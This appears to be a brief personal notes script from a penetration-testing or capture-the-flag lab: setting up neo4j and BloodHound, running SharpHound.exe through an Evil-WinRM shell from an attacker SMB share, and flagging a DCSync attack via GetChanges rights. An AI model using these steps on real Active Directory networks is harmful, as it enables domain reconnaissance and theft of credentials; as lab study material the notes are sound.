#! /bin/bash

# clone the repo to /opt. https://github.com/BloodHoundAD/BloodHound

apt install neo4j
neo4j start

# If you’re running as root, you’ll need the --no-sandbox flag

# you can delete /usr/share/neo4j/data/dbms/auth and then it’s like a fresh install

neo4j console
# default creds, neo4j/neo4j. change the neo4j password

# Now the BloodHound program can connect, thought first I need data.

# grab SharpHound.exe from the injestors folder, and make a copy in my SMB share
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share> .\SharpHound.exe
# upload the zip to bloodhound

# The account has access to GetChanges and GetChangesAll on the domain. -> DCSync attack


